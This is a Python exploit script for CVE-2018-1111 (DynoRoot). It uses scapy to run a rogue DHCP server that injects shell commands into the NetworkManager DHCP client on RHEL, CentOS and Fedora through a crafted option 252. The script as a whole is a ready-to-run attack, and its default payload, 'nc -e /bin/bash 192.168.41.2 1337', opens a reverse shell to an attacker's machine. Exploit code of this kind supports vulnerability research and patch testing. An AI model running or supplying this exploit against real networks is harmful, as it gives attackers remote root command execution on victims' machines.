#!/usr/bin/env python
# -*- coding: utf-8 -*-

# Exploit Title: DynoRoot DHCP Client Command Injection
# Date: May 18, 2018
# Exploit Author: Kevin Kirsche (d3c3pt10n)
# Exploit Repository: https://github.com/kkirsche/CVE-2018-1111
# Exploit Discoverer: Felix Wilhelm (@_fel1x on twitter)
# Exploit Webpage: https://dynoroot.ninja
# Vendor Homepage: https://www.redhat.com/
# Version: RHEL 6.x / 7.x and CentOS 6.x/7.x
# Versions affected per RHEL release, not validated on RHEL / CentOS 6.x
#     as such, it may not function on this version
# Tested on:
#   * CentOS Linux release 7.4.1708 (Core) / NetworkManager 1.8.0-11.el7_4
#   * Fedora Linux 27 (Workstation Edition) / NetworkManager 2.29-6.fc27 
# CVE : CVE-2018-1111

from argparse import ArgumentParser
from scapy.all import BOOTP_am, DHCP, Ether
from scapy.base_classes import Net
from scapy.layers.dhcp import DHCPTypes

"""
DHCP Message Types: {
  DISCOVER -> 1
  OFFER    -> 2
  REQUEST  -> 3
  DECLINE  -> 4
  ACK      -> 5
  NAK      -> 6
  RELEASE  -> 7
}
"""


class DynoRoot(BOOTP_am):
    function_name = "dhcpd"

    def is_request(self, req):
        # Ignore non-DHCP requests
        if DHCP not in req:
            return False

        options_dict = dict(
            op for op in req[DHCP].options 
            if isinstance(op, tuple) and len(op)==2
        )

        # Ignore DHCP messages other than discovery and request
        if DHCPTypes[options_dict["message-type"]] not in {"discover", "request"}:
            return False

        # Ignore DHCP messages coming from this MAC
        if req[Ether].src == self.ignore_mac:
            return False

        return super().is_request(req)

    def make_reply(self, req):
        payload_enc = "x'&{payload} #".format(payload=self.payload).encode('utf-8')

        options_dict = dict(
            op for op in req[DHCP].options 
            if isinstance(op, tuple) and len(op)==2
        )

        message_type = DHCPTypes[options_dict["message-type"]]
        if message_type == "discover":
            print(f"Received DHCP DISCOVER from {req[Ether].src}")
            message_type_reply = "offer"
        elif message_type == "request":
            print(
                f"Received DHCP REQUEST for IP "
                f"{options_dict['requested_addr']} from {req[Ether].src}"
            )
            message_type_reply = "ack"
        else:
            raise ValueError(f"Invalid DHCP type: {message_type}")     

        dhcp_options = [
            ("message-type", message_type_reply),
            ("server_id", self.gw),
            ("domain", self.domain),
            ("router", self.gw),
            ("name_server", self.gw),
            ("broadcast_address", self.broadcast),
            ("subnet_mask", self.netmask),
            ("renewal_time", self.renewal_time),
            ("lease_time", self.lease_time),
            (252, payload_enc),
            "end"
        ]
        resp = BOOTP_am.make_reply(self, req) / DHCP(options=dhcp_options)
        return resp


if __name__ == '__main__':
    parser = ArgumentParser(description='CVE-2018-1111 DynoRoot exploit')

    parser.add_argument('-i', '--interface', default='eth0', type=str,
                        dest='interface',
                        help='The interface to listen for DHCP requests on (default: eth0)')
    parser.add_argument('-s', '--subnet', default='192.168.41.0/24', type=str,
                        dest='subnet', help='The network to assign via DHCP (default: 192.168.41.0/24)')
    parser.add_argument('-g', '--gateway', default='192.168.41.254', type=str,
                        dest='gateway', help='The network gateway to respond with (default: 192.168.41.254)')
    parser.add_argument('-d', '--domain', default='victim.net', type=str,
                        dest='domain', help='Domain to assign (default: victim.net)')
    parser.add_argument('-r', '--renewal-time', default=600, type=int,
                        dest='renewal_time', help='The DHCP lease renewal interval (default: 600)')
    parser.add_argument('-l', '--lease-time', default=3600, type=int,
                        dest='lease_time', help='The DHCP lease duration (default: 3600)')
    parser.add_argument('-p', '--payload', default='nc -e /bin/bash 192.168.41.2 1337', type=str,
                        dest='payload', help='The payload / command to inject (default: nc -e /bin/bash 192.168.41.2 1337)')
    parser.add_argument('-m', '--ignore-mac', default=None, type=str,
                        dest='ignore_mac', help='Do not reply to DHCP requests from this mac address (e.g. 08:aa:bb:cc:dd:ee:ff)')

    args = parser.parse_args()
    server = DynoRoot(iface=args.interface, domain=args.domain,
                      pool=Net(args.subnet),
                      network=args.subnet,
                      gw=args.gateway,
                      renewal_time=args.renewal_time,
                      lease_time=args.lease_time)
    server.payload = args.payload
    server.ignore_mac = args.ignore_mac

    server()
